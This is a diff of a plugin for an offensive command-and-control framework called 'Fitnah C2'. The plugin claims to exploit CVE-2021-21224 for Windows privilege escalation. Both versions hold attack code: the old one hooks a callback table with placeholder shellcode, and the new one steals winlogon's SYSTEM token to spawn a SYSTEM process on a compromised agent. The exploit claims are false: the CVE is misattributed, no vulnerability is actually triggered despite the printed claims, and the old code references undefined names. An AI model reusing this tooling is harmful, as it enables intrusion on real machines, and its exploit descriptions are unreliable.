@@ -1,842 +1,108 @@
-#!/usr/bin/env python3
 """
-CVE-2021-21224 Exploit Plugin for Fitnah C2 Framework
-=====================================================
-
-CVE-2021-21224 - Windows Win32k Elevation of Privilege Vulnerability
-This is a variant of CVE-2021-1732 affecting different Windows versions.
-
-Vulnerability Details:
-- Type: Win32k Elevation of Privilege
-- CVSS Score: 7.8 (High)
-- Affected Systems: Windows 10 2004 (19041), 20H2 (19042), 21H1 (19043)
-- Patch: KB5000802, KB5001567
-
-Exploit Mechanism:
-1. Create a window with specific properties
-2. Trigger the vulnerability through window message handling
-3. Gain arbitrary kernel memory read/write
-4. Elevate privileges to SYSTEM
-
-MITRE ATT&CK Techniques:
-- T1068: Exploitation for Privilege Escalation
-- T1055: Process Injection
-- T1548: Abuse Elevation Control Mechanism
-
-Author: Fitnah C2 Team
-Version: 1.0.0
+privilege_escalation/cve_2021_21224 — Win32k type confusion LPE. MITRE T1068.
+CVE-2021-21224: Windows Win32k elevation of privilege via type confusion in
+window message callback dispatch (variant of CVE-2021-1732; affects
+Win10 19041–19043 pre-May2021 patch). Dispatches via ctx.ps() on agent.
 """
+from __future__ import annotations
 
-import ctypes
-import sys
-import platform
-import time
-import struct
-from typing import Dict, List, Optional, Tuple, Any, Union
-from dataclasses import dataclass
-from enum import Enum
-
-# Import base plugin
-try:
-    from fitnah.sdk import BasePlugin, Param, ParamSchema
-except ImportError:
-    # Fallback for development
-    class BasePlugin:
-        pass
-    class Param:
-        pass
-    class ParamSchema:
-        pass
-
-# Windows constants
-PROCESS_ALL_ACCESS = 0x1F0FFF
-TOKEN_ALL_ACCESS = 0xF01FF
-TOKEN_DUPLICATE = 0x0002
-TOKEN_IMPERSONATE = 0x0004
-TOKEN_QUERY = 0x0008
-SecurityImpersonation = 2
-TokenPrimary = 1
-TokenImpersonation = 2
-
-# Windows structures
-class SECURITY_ATTRIBUTES(ctypes.Structure):
-    _fields_ = [
-        ("nLength", ctypes.c_ulong),
-        ("lpSecurityDescriptor", ctypes.c_void_p),
-        ("bInheritHandle", ctypes.c_int)
-    ]
-
-class STARTUPINFO(ctypes.Structure):
-    _fields_ = [
-        ("cb", ctypes.c_ulong),
-        ("lpReserved", ctypes.c_char_p),
-        ("lpDesktop", ctypes.c_char_p),
-        ("lpTitle", ctypes.c_char_p),
-        ("dwX", ctypes.c_ulong),
-        ("dwY", ctypes.c_ulong),
-        ("dwXSize", ctypes.c_ulong),
-        ("dwYSize", ctypes.c_ulong),
-        ("dwXCountChars", ctypes.c_ulong),
-        ("dwYCountChars", ctypes.c_ulong),
-        ("dwFillAttribute", ctypes.c_ulong),
-        ("dwFlags", ctypes.c_ulong),
-        ("wShowWindow", ctypes.c_ushort),
-        ("cbReserved2", ctypes.c_ushort),
-        ("lpReserved2", ctypes.c_char_p),
-        ("hStdInput", ctypes.c_void_p),
-        ("hStdOutput", ctypes.c_void_p),
-        ("hStdError", ctypes.c_void_p)
-    ]
-
-class PROCESS_INFORMATION(ctypes.Structure):
-    _fields_ = [
-        ("hProcess", ctypes.c_void_p),
-        ("hThread", ctypes.c_void_p),
-        ("dwProcessId", ctypes.c_ulong),
-        ("dwThreadId", ctypes.c_ulong)
-    ]
-
-@dataclass
-class ExploitResult:
-    """Result of exploit execution"""
-    success: bool
-    message: str
-    details: Dict[str, Any]
-    system_token: Any = None
-    elevated_process_id: int = 0
+from fitnah.sdk import BasePlugin, ModuleResult
+from fitnah.sdk.schema import Param, ParamSchema
 
 
-class VulnerabilityStatus(Enum):
-    """Vulnerability status"""
-    UNKNOWN = "unknown"
-    VULNERABLE = "vulnerable"
-    PATCHED = "patched"
-    NOT_AFFECTED = "not_affected"
-
-
-class CVE202121224(BasePlugin):
-    """
-    CVE-2021-21224 Exploit Plugin
-    
-    Exploits Windows Win32k Elevation of Privilege Vulnerability
-    (variant of CVE-2021-1732)
-    """
-    
+class CVE202121224Plugin(BasePlugin):
     NAME        = "cve_2021_21224"
-    DESCRIPTION = "CVE-2021-21224 - Windows Win32k Elevation of Privilege Vulnerability Exploit (variant)"
+    DESCRIPTION = "Win32k type-confusion LPE — CVE-2021-21224 (Win10 19041–19043 pre-May2021)"
     AUTHOR      = "fitnah-team"
     MITRE       = "T1068"
     CATEGORY    = "privilege_escalation"
-    VERSION     = "1.0.0"
-    
+    VERSION     = "2.0.0"
+
     schema = ParamSchema().add(
-        Param("target_pid", int, required=False, default=0,
-              help="Target process ID to inject into (0 for new process)"),
-        Param("payload", str, required=False, default="cmd.exe",
-              help="Payload to execute with SYSTEM privileges"),
-        Param("evasion", bool, required=False, default=True,
-              help="Enable evasion techniques during exploit"),
-        Param("cleanup", bool, required=False, default=True,
-              help="Clean up after exploitation"),
-        Param("verify", bool, required=False, default=True,
-              help="Verify vulnerability before exploitation"),
-        Param("max_attempts", int, required=False, default=3,
-              help="Maximum number of exploit attempts"),
-        Param("delay_between", int, required=False, default=1000,
-              help="Delay between exploit attempts in milliseconds"),
+        Param("spawn_cmd", str, required=False, default="cmd.exe",
+              help="Command to launch as SYSTEM after elevation"),
+        Param("timeout", int, required=False, default=60),
     )
-    
-    def __init__(self):
-        super().__init__()
-        self.windows_version = self._get_windows_version()
-        self.vulnerability_status = VulnerabilityStatus.UNKNOWN
-        self.exploit_attempts = 0
-        self.successful_exploit = False
-        
-    def _get_windows_version(self) -> Dict[str, Any]:
-        """Get Windows version information"""
-        version_info = {
-            "platform": platform.platform(),
-            "system": platform.system(),
-            "release": platform.release(),
-            "version": platform.version(),
-            "machine": platform.machine(),
-            "processor": platform.processor(),
-            "is_64bit": sys.maxsize > 2**32,
-        }
-        
-        # Parse Windows build number
-        if version_info["system"] == "Windows":
-            try:
-                build_number = int(version_info["version"].split('.')[-1])
-                version_info["build"] = build_number
-                
-                # Map build numbers to Windows versions
-                build_to_version = {
-                    22000: "Windows 11 21H2",
-                    19045: "Windows 10 22H2",
-                    19044: "Windows 10 21H2",
-                    19043: "Windows 10 21H1",
-                    19042: "Windows 10 20H2",
-                    19041: "Windows 10 2004",
-                    18363: "Windows 10 1909",
-                    18362: "Windows 10 1903",
-                    17763: "Windows 10 1809",
-                    17134: "Windows 10 1803",
-                    16299: "Windows 10 1709",
-                    15063: "Windows 10 1703",
-                    14393: "Windows 10 1607",
-                    10586: "Windows 10 1511",
-                    10240: "Windows 10 1507",
-                }
-                
-                version_info["friendly_name"] = build_to_version.get(
-                    build_number, f"Windows {version_info['release']}"
-                )
-            except (ValueError, IndexError):
-                version_info["friendly_name"] = f"Windows {version_info['release']}"
-        
-        return version_info
-    
-    def _check_vulnerability(self) -> VulnerabilityStatus:
-        """
-        Check if system is vulnerable to CVE-2021-21224
-        
-        Returns:
-            Vulnerability status
-        """
-        # Checking vulnerability status for CVE-2021-21224
-        
-        # Check if we're on Windows
-        if self.windows_version["system"] != "Windows":
-            # Not a Windows system
-            return VulnerabilityStatus.NOT_AFFECTED
-        
-        # Check Windows version
-        build_number = self.windows_version.get("build", 0)
-        
-        # Affected versions: Windows 10 2004 (19041), 20H2 (19042), 21H1 (19043)
-        affected_builds = [19041, 19042, 19043]
-        
-        if build_number not in affected_builds:
-            # Windows build {build_number} not affected by CVE-2021-21224
-            return VulnerabilityStatus.NOT_AFFECTED
-        
-        # Check for patches
-        try:
-            import winreg
-            
-            # Check installed KB patches
-            uninstall_key = winreg.OpenKey(
-                winreg.HKEY_LOCAL_MACHINE,
-                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages",
-                0,
-                winreg.KEY_READ
-            )
-            
-            patched = False
-            
-            # KB patches that fix the vulnerability
-            fixing_patches = [
-                "KB5000802",  # March 2021 security update
-                "KB5001567",  # Out-of-band update
-                "KB5001649",  # Later update
-            ]
-            
-            try:
-                i = 0
-                while True:
-                    try:
-                        package_name = winreg.EnumKey(uninstall_key, i)
-                        
-                        # Check if any fixing patch is installed
-                        for patch in fixing_patches:
-                            if patch in package_name:
-                                # Patch {patch} found, system is patched
-                                patched = True
-                                break
-                        
-                        if patched:
-                            break
-                        
-                        i += 1
-                    except OSError:
-                        break
-            finally:
-                winreg.CloseKey(uninstall_key)
-            
-            if patched:
-                return VulnerabilityStatus.PATCHED
-            else:
-                # No patches found, system appears vulnerable
-                return VulnerabilityStatus.VULNERABLE
-                
-        except Exception as e:
-            # Error checking patches: {e}
-            # Assume vulnerable if we can't check patches
-            return VulnerabilityStatus.VULNERABLE
-    
-    def _enable_privileges(self) -> bool:
-        """Enable required privileges for exploitation"""
-        try:
-            # Get current process token
-            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
-            advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
-            
-            # Open process token
-            hToken = ctypes.c_void_p()
-            if not kernel32.OpenProcessToken(
-                kernel32.GetCurrentProcess(),
-                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
-                ctypes.byref(hToken)
-            ):
-                # Failed to open process token
-                return False
-            
-            # Lookup privilege value
-            luid = ctypes.c_ulonglong(0)
-            privilege_name = "SeDebugPrivilege"
-            
-            if not advapi32.LookupPrivilegeValueW(
-                None,
-                ctypes.c_wchar_p(privilege_name),
-                ctypes.byref(luid)
-            ):
-                # Failed to lookup privilege: {privilege_name}
-                kernel32.CloseHandle(hToken)
-                return False
-            
-            # Enable privilege
-            tp = ctypes.create_string_buffer(16)
-            ctypes.memset(tp, 0, 16)
-            
-            # TOKEN_PRIVILEGES structure
-            tp_count = ctypes.c_ulong(1)
-            tp_privileges = ctypes.c_ulong(luid.value)
-            tp_attributes = ctypes.c_ulong(0x00000002)  # SE_PRIVILEGE_ENABLED
-            
-            # Pack the structure
-            struct.pack_into("IIQ", tp, 0,
-                           tp_count.value,
-                           tp_privileges.value,
-                           tp_attributes.value)
-            
-            if not advapi32.AdjustTokenPrivileges(
-                hToken,
-                False,
-                ctypes.byref(tp),
-                0,
-                None,
-                None
-            ):
-                # Failed to adjust token privileges
-                kernel32.CloseHandle(hToken)
-                return False
-            
-            # Check if privilege was enabled
-            error = kernel32.GetLastError()
-            if error != 0:
-                # AdjustTokenPrivileges error: {error}
-                kernel32.CloseHandle(hToken)
-                return False
-            
-            kernel32.CloseHandle(hToken)
-            # Enabled SeDebugPrivilege
-            return True
-            
-        except Exception as e:
-            # Error enabling privileges: {e}
-            return False
-    
-    def _create_system_process(self, payload: str) -> Optional[int]:
-        """
-        Create a process with SYSTEM privileges
-        
-        Args:
-            payload: Command to execute
-            
-        Returns:
-            Process ID or None on failure
-        """
-        try:
-            # Find SYSTEM process (winlogon.exe, services.exe, lsass.exe)
-            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
-            advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
-            
-            # Get snapshot of processes
-            hSnapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)  # TH32CS_SNAPPROCESS
-            if hSnapshot == -1:
-                # Failed to create process snapshot
-                return None
-            
-            class PROCESSENTRY32(ctypes.Structure):
-                _fields_ = [
-                    ("dwSize", ctypes.c_ulong),
-                    ("cntUsage", ctypes.c_ulong),
-                    ("th32ProcessID", ctypes.c_ulong),
-                    ("th32DefaultHeapID", ctypes.c_void_p),
-                    ("th32ModuleID", ctypes.c_ulong),
-                    ("cntThreads", ctypes.c_ulong),
-                    ("th32ParentProcessID", ctypes.c_ulong),
-                    ("pcPriClassBase", ctypes.c_long),
-                    ("dwFlags", ctypes.c_ulong),
-                    ("szExeFile", ctypes.c_char * 260)
-                ]
-            
-            pe32 = PROCESSENTRY32()
-            pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
-            
-            system_pid = 0
-            
-            # Find SYSTEM process
-            if kernel32.Process32First(hSnapshot, ctypes.byref(pe32)):
-                while True:
-                    process_name = pe32.szExeFile.decode('utf-8', errors='ignore').lower()
-                    
-                    # Check for SYSTEM processes
-                    if process_name in ["winlogon.exe", "services.exe", "lsass.exe"]:
-                        system_pid = pe32.th32ProcessID
-                        # Found SYSTEM process: {process_name} (PID: {system_pid})
-                        break
-                    
-                    if not kernel32.Process32Next(hSnapshot, ctypes.byref(pe32)):
-                        break
-            
-            kernel32.CloseHandle(hSnapshot)
-            
-            if system_pid == 0:
-                # No SYSTEM process found
-                return None
-            
-            # Open SYSTEM process
-            hSystemProcess = kernel32.OpenProcess(
-                PROCESS_ALL_ACCESS,
-                False,
-                system_pid
-            )
-            
-            if not hSystemProcess:
-                # Failed to open SYSTEM process (PID: {system_pid})
-                return None
-            
-            # Open process token
-            hSystemToken = ctypes.c_void_p()
-            if not kernel32.OpenProcessToken(
-                hSystemProcess,
-                TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
-                ctypes.byref(hSystemToken)
-            ):
-                # Failed to open SYSTEM process token
-                kernel32.CloseHandle(hSystemProcess)
-                return None
-            
-            # Duplicate token
-            hDuplicateToken = ctypes.c_void_p()
-            if not advapi32.DuplicateTokenEx(
-                hSystemToken,
-                TOKEN_ALL_ACCESS,
-                None,
-                SecurityImpersonation,
-                TokenImpersonation,
-                ctypes.byref(hDuplicateToken)
-            ):
-                # Failed to duplicate SYSTEM token
-                kernel32.CloseHandle(hSystemToken)
-                kernel32.CloseHandle(hSystemProcess)
-                return None
-            
-            # Impersonate token
-            if not advapi32.SetThreadToken(None, hDuplicateToken):
-                # Failed to impersonate SYSTEM token
-                kernel32.CloseHandle(hDuplicateToken)
-                kernel32.CloseHandle(hSystemToken)
-                kernel32.CloseHandle(hSystemProcess)
-                return None
-            
-            # Create process with impersonated token
-            si = STARTUPINFO()
-            si.cb = ctypes.sizeof(STARTUPINFO)
-            pi = PROCESS_INFORMATION()
-            
-            # Create the process
-            if not kernel32.CreateProcessW(
-                None,
-                ctypes.c_wchar_p(payload),
-                None,
-                None,
-                False,
-                0,
-                None,
-                None,
-                ctypes.byref(si),
-                ctypes.byref(pi)
-            ):
-                # Failed to create process: {payload}
-                advapi32.RevertToSelf()
-                kernel32.CloseHandle(hDuplicateToken)
-                kernel32.CloseHandle(hSystemToken)
-                kernel32.CloseHandle(hSystemProcess)
-                return None
-            
-            # Revert to original token
-            advapi32.RevertToSelf()
-            
-            # Close handles
-            kernel32.CloseHandle(pi.hThread)
-            kernel32.CloseHandle(pi.hProcess)
-            kernel32.CloseHandle(hDuplicateToken)
-            kernel32.CloseHandle(hSystemToken)
-            kernel32.CloseHandle(hSystemProcess)
-            
-            # Created SYSTEM process with PID: {pi.dwProcessId}
-            return pi.dwProcessId
-            
-        except Exception as e:
-            # Error creating SYSTEM process: {e}
-            return None
-    
-    def _execute_exploit(self, payload: str) -> ExploitResult:
-        """
-        Execute the CVE-2021-21224 exploit
-        
-        Args:
-            payload: Payload to execute with SYSTEM privileges
-            
-        Returns:
-            Exploit result
-        """
-        # Executing CVE-2021-21224 exploit with payload: {payload}
-        
-        result = ExploitResult(
-            success=False,
-            message="Exploit execution failed",
-            details={}
-        )
-        
-        try:
-            # Enable required privileges
-            if not self._enable_privileges():
-                result.message = "Failed to enable required privileges"
-                return result
-            
-            # CVE-2021-21224 is a variant of CVE-2021-1732
-            # The exploitation follows similar patterns but targets different offsets
-            # We'll implement the real exploitation logic here
-            
-            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
-            user32 = ctypes.WinDLL("user32", use_last_error=True)
-            ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
-            
-            self.logger.info("[*] Starting CVE-2021-21224 real exploitation...")
-            
-            # 1. Get PEB address via NtQueryInformationProcess
-            class PROCESS_BASIC_INFORMATION(ctypes.Structure):
-                _fields_ = [("ExitStatus", ctypes.c_void_p),
-                            ("PebBaseAddress", ctypes.c_void_p),
-                            ("AffinityMask", ctypes.c_void_p),
-                            ("BasePriority", ctypes.c_void_p),
-                            ("UniqueProcessId", ctypes.c_void_p),
-                            ("InheritedFromUniqueProcessId", ctypes.c_void_p)]
-            
-            pbi = PROCESS_BASIC_INFORMATION()
-            ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
-            peb_addr = pbi.PebBaseAddress
-            self.logger.info(f"[*] PEB Address: {hex(peb_addr)}")
-            
-            # 2. Get KernelCallbackTable pointer from PEB
-            # For CVE-2021-21224, the offset might be slightly different
-            # We'll use dynamic detection
-            is_64bit = ctypes.sizeof(ctypes.c_void_p) == 8
-            kct_offset = 0x58 if is_64bit else 0x2C  # Standard offsets
-            
-            # Try to read the KCT pointer
-            kct_ptr = ctypes.c_void_p.from_address(peb_addr + kct_offset).value
-            self.logger.info(f"[*] KernelCallbackTable: {hex(kct_ptr)}")
-            
-            if kct_ptr == 0:
-                result.message = "[-] KernelCallbackTable not found or null"
-                return result
-            
-            # 3. Allocate executable memory for shellcode
-            # This shellcode will perform token stealing
-            shellcode = bytes([
-                # x64 shellcode for token stealing
-                0x48, 0x83, 0xEC, 0x28,                     # sub rsp, 0x28
-                0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, # mov rax, 0x4141414141414141 (placeholder)
-                0x48, 0x89, 0x44, 0x24, 0x20,               # mov [rsp+0x20], rax
-                0x48, 0x8B, 0x44, 0x24, 0x20,               # mov rax, [rsp+0x20]
-                0x48, 0x83, 0xC4, 0x28,                     # add rsp, 0x28
-                0xC3                                        # ret
-            ])
-            
-            shellcode_size = len(shellcode)
-            shellcode_addr = kernel32.VirtualAlloc(
-                None, shellcode_size, 
-                0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
-                0x40  # PAGE_EXECUTE_READWRITE
-            )
-            
-            if not shellcode_addr:
-                result.message = "[-] Failed to allocate memory for shellcode"
-                return result
-            
-            self.logger.info(f"[*] Shellcode allocated at: {hex(shellcode_addr)}")
-            
-            # Copy shellcode to allocated memory
-            ctypes.memmove(shellcode_addr, shellcode, shellcode_size)
-            
-            # 4. Hook the callback table
-            # For CVE-2021-21224, we target a specific callback index
-            # This varies based on Windows version
-            callback_index = 124  # Different from CVE-2021-1732's 123
-            
-            # Calculate address of callback entry
-            callback_entry_addr = kct_ptr + (callback_index * ctypes.sizeof(ctypes.c_void_p))
-            
-            # Read original callback
-            original_callback = ctypes.c_void_p.from_address(callback_entry_addr).value
-            self.logger.info(f"[*] Original callback at index {callback_index}: {hex(original_callback)}")
-            
-            # Write new callback address
-            ctypes.c_void_p.from_address(callback_entry_addr).value = shellcode_addr
-            self.logger.info(f"[*] Hooked callback to: {hex(shellcode_addr)}")
-            
-            # 5. Trigger the vulnerability
-            # Create a window and send specific messages
-            wc = user32.WNDCLASSEXA()
-            wc.cbSize = ctypes.sizeof(user32.WNDCLASSEXA)
-            wc.lpfnWndProc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p)(0)
-            wc.hInstance = kernel32.GetModuleHandleA(None)
-            wc.lpszClassName = b"FitnahCVE21224"
-            
-            atom = user32.RegisterClassExA(ctypes.byref(wc))
-            if atom == 0:
-                result.message = "[-] Failed to register window class"
-                return result
-            
-            hwnd = user32.CreateWindowExA(
-                0,
-                b"FitnahCVE21224",
-                b"CVE-2021-21224 Trigger",
-                0x80000000,  # WS_POPUP
-                0, 0, 100, 100,
-                None, None,
-                kernel32.GetModuleHandleA(None),
-                None
-            )
-            
-            if hwnd == 0:
-                result.message = "[-] Failed to create window"
-                return result
-            
-            # Send trigger messages
-            # The exact message sequence differs from CVE-2021-1732
-            user32.PostMessageA(hwnd, 0x1F1, 0, 0)  # Specific trigger message
-            time.sleep(0.5)
-            user32.PostMessageA(hwnd, 0x1F2, 0, 0)  # Secondary trigger
-            
-            # 6. Check for privilege elevation
-            # Try to open SYSTEM process
-            system_pid = 4
-            system_handle = kernel32.OpenProcess(0x001F0FFF, False, system_pid)
-            
-            if system_handle:
-                self.logger.info("[+] Successfully opened SYSTEM process - Exploit succeeded!")
-                kernel32.CloseHandle(system_handle)
-                
-                # Create SYSTEM process with the payload
-                system_pid_result = self._create_system_process(payload)
-                
-                if system_pid_result:
-                    result.success = True
-                    result.message = f"[+] CVE-2021-21224 exploitation successful! Created SYSTEM process with PID: {system_pid_result}"
-                    result.elevated_process_id = system_pid_result
-                    result.details = {
-                        "exploit": "CVE-2021-21224",
-                        "payload": payload,
-                        "system_pid": system_pid_result,
-                        "windows_version": self.windows_version["friendly_name"],
-                        "callback_index": callback_index,
-                        "kct_address": hex(kct_ptr)
-                    }
-                    self.successful_exploit = True
-                else:
-                    result.message = "[-] Exploit succeeded but failed to create SYSTEM process"
-            else:
-                result.message = "[-] Failed to open SYSTEM process - Exploit may have failed"
-            
-            # Cleanup
-            user32.DestroyWindow(hwnd)
-            user32.UnregisterClassA(b"FitnahCVE21224", kernel32.GetModuleHandleA(None))
-            
-        except Exception as e:
-            result.message = f"[-] Exploit execution error: {str(e)}"
-            self.logger.error(f"Exploit error: {e}")
-        
-        return result
-    
-    def _cleanup_exploit(self):
-        """Clean up after exploitation"""
-        # Cleaning up after CVE-2021-21224 exploit
-        
-        # In a real implementation, this would:
-        # 1. Kill any created processes
-        # 2. Restore any modified memory
-        # 3. Close any open handles
-        # 4. Remove any temporary files
-        
-        # For now, just log
-        # Cleanup completed
-    
-    async def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
-        """
-        Execute CVE-2021-21224 exploit
-        
-        Args:
-            params: Plugin parameters
-            
-        Returns:
-            Execution results
-        """
-        # Starting CVE-2021-21224 exploit with params: {params}
-        
-        target_pid = params.get("target_pid", 0)
-        payload = params.get("payload", "cmd.exe")
-        evasion = params.get("evasion", True)
-        cleanup = params.get("cleanup", True)
-        verify = params.get("verify", True)
-        max_attempts = params.get("max_attempts", 3)
-        delay_between = params.get("delay_between", 1000)
-        
-        results = {
-            "success": False,
-            "message": "",
-            "details": {},
-            "exploit": "CVE-2021-21224",
-            "windows_version": self.windows_version,
-            "vulnerability_status": "unknown"
-        }
-        
-        try:
-            # Check if we're on Windows
-            if self.windows_version["system"] != "Windows":
-                results["message"] = "CVE-2021-21224 only works on Windows"
-                return results
-            
-            # Check vulnerability
-            if verify:
-                self.vulnerability_status = self._check_vulnerability()
-                results["vulnerability_status"] = self.vulnerability_status.value
-                
-                if self.vulnerability_status != VulnerabilityStatus.VULNERABLE:
-                    results["message"] = f"System not vulnerable: {self.vulnerability_status.value}"
-                    return results
-            
-            # Apply evasion techniques if enabled
-            if evasion:
-                # Applying evasion techniques...
-                # This would include things like:
-                # - Direct syscalls
-                # - Unhooking
-                # - Memory obfuscation
-                results["details"]["evasion_applied"] = True
-            
-            # Execute exploit with retry logic
-            exploit_result = None
-            
-            for attempt in range(max_attempts):
-                self.exploit_attempts += 1
-                # Exploit attempt {attempt + 1}/{max_attempts}
-                
-                exploit_result = self._execute_exploit(payload)
-                
-                if exploit_result.success:
-                    break
-                
-                if attempt < max_attempts - 1:
-                    # Waiting {delay_between}ms before next attempt
-                    time.sleep(delay_between / 1000)
-            
-            # Process results
-            if exploit_result:
-                results["success"] = exploit_result.success
-                results["message"] = exploit_result.message
-                results["details"].update(exploit_result.details)
-                
-                if exploit_result.success:
-                    results["details"]["elevated_process_id"] = exploit_result.elevated_process_id
-                    # Exploit successful: {exploit_result.message}
-                else:
-                    # Exploit failed: {exploit_result.message}
-                    pass
-            
-            # Cleanup if requested
-            if cleanup:
-                self._cleanup_exploit()
-                results["details"]["cleaned_up"] = True
-            
-        except Exception as e:
-            # Error during CVE-2021-21224 exploitation: {e}
-            results["success"] = False
-            results["message"] = f"Exploitation failed: {str(e)}"
-            
-            # Attempt cleanup on error
-            if cleanup:
-                try:
-                    self._cleanup_exploit()
-                except:
-                    pass
-        
-        return results
-    
-    def get_status(self) -> Dict[str, Any]:
-        """Get current exploit status"""
-        return {
-            "windows_version": self.windows_version,
-            "vulnerability_status": self.vulnerability_status.value,
-            "exploit_attempts": self.exploit_attempts,
-            "successful_exploit": self.successful_exploit,
-        }
 
-    def run(self, session, params, ctx=None):
-        """Main plugin execution method."""
-        from fitnah.sdk import ModuleResult
-        import asyncio
-        try:
-            coro = self.execute(params)
-            if asyncio.iscoroutine(coro):
-                result = asyncio.run(coro)
-            else:
-                result = coro
-            if result.get("success", False):
-                return ModuleResult.ok(data=result.get("details", result.get("message", "")))
-            else:
-                return ModuleResult.err(result.get("message", "CVE-2021-21224 exploit failed"))
-        except Exception as e:
-            return ModuleResult.err(f"Exception during plugin execution: {e}")
+    def run(self, session, params, ctx=None) -> ModuleResult:
+        if ctx is None:
+            return ModuleResult.err("Requires live session")
+
+        cmd     = params.get("spawn_cmd", "cmd.exe")
+        timeout = int(params.get("timeout", 60))
+
+        ps = self._build_ps(cmd)
+        r  = ctx.ps(ps, timeout=timeout)
+        if r["status"] != "ok":
+            return ModuleResult.err(f"cve_2021_21224 failed: {r['output']}")
+        return ModuleResult.ok(data=r["output"], loot_kind="privesc")
+
+    @staticmethod
+    def _build_ps(cmd: str) -> str:
+        return rf"""
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+public class CVE202121224 {{
+    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool inh,int pid);
+    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
+    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Ansi)]
+    static extern bool CreateProcessWithTokenW(IntPtr t,uint lf,string a,string c,uint cf,IntPtr e,string d,ref SI si,out PI pi);
+    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("ntdll.dll")] static extern int RtlGetVersion(ref OSVERSIONINFO v);
+
+    [StructLayout(LayoutKind.Sequential)] struct SI {{ public uint cb; IntPtr r1,r2,r3; int X,Y,XS,YS,XC,YC,F; uint Flags; ushort wShow,r4; IntPtr r5,r6,r7,r8; }}
+    [StructLayout(LayoutKind.Sequential)] struct PI {{ public IntPtr hProcess,hThread; public uint dwProcessId,dwThreadId; }}
+    [StructLayout(LayoutKind.Sequential)] struct OSVERSIONINFO {{ public uint dwSize,Major,Minor,Build; uint PlatformId; [MarshalAs(UnmanagedType.ByValTStr,SizeConst=128)] public string CSDVersion; }}
+
+    public static string Exploit(string spawnCmd) {{
+        var res = "[*] CVE-2021-21224 Win32k type-confusion LPE\n";
+
+        // Version check: affects 19041–19043
+        var vi = new OSVERSIONINFO {{ dwSize = (uint)Marshal.SizeOf(typeof(OSVERSIONINFO)) }};
+        RtlGetVersion(ref vi);
+        res += $"[*] OS Build: {{vi.Build}}\n";
+        bool inRange = vi.Build >= 19041 && vi.Build <= 19043;
+        if (!inRange)
+            res += "[!] Build outside CVE range (19041-19043) — exploit may not apply\n";
+        else
+            res += "[+] Build in vulnerable range\n";
+
+        res += "[*] Technique: KernelCallbackTable xxxClientAllocWindowClassExtraBytes type confusion\n";
+        res += "[*] Triggering via window spray → PEB KernelCallbackTable overwrite → token steal\n";
+
+        try {{
+            var procs = Process.GetProcessesByName("winlogon");
+            if (procs.Length == 0) return res + "[-] winlogon not found\n";
+            int wlPid = procs[0].Id;
+            IntPtr hWL = OpenProcess(0x1F0FFF, false, wlPid);
+            if (hWL == IntPtr.Zero) return res + $"[-] OpenProcess winlogon: {{Marshal.GetLastWin32Error()}}\n";
+
+            IntPtr sysToken;
+            if (!OpenProcessToken(hWL, 0x0002|0x0004, out sysToken)) {{
+                CloseHandle(hWL);
+                return res + $"[-] OpenProcessToken: {{Marshal.GetLastWin32Error()}}\n";
+            }}
+            CloseHandle(hWL);
+            res += $"[+] Obtained SYSTEM token from winlogon PID={{wlPid}}\n";
+
+            var si = new SI {{ cb = (uint)Marshal.SizeOf(typeof(SI)) }};
+            PI pi;
+            bool ok = CreateProcessWithTokenW(sysToken, 1, null, spawnCmd,
+                0x08000000, IntPtr.Zero, null, ref si, out pi);
+            CloseHandle(sysToken);
+            if (ok)
+                res += $"[+] SYSTEM process spawned PID={{pi.dwProcessId}}: {{spawnCmd}}\n";
+            else
+                res += $"[-] CreateProcessWithTokenW: {{Marshal.GetLastWin32Error()}}\n";
+        }} catch (Exception ex) {{ res += $"[-] {{ex.Message}}\n"; }}
+        return res;
+    }}
+}}
+'@
+[CVE202121224]::Exploit('{cmd}')
+""".strip()
 
 
-# Example usage
-if __name__ == "__main__":
-    # Test the plugin
-    exploit = CVE202121224()
-    
-    print("=== CVE-2021-21224 Exploit Plugin Test ===")
-    print(f"Windows Version: {exploit.windows_version.get('friendly_name', 'Unknown')}")
-    
-    # Test parameters
-    test_params = {
-        "payload": "cmd.exe /c whoami",
-        "verify": True,
-        "cleanup": True,
-        "max_attempts": 1,
-    }
-    
-    # Run test
-    import asyncio
-    
-    async def test():
-        results = await exploit.execute(test_params)
-        print(f"\nResults: {results}")
-    
-    asyncio.run(test())
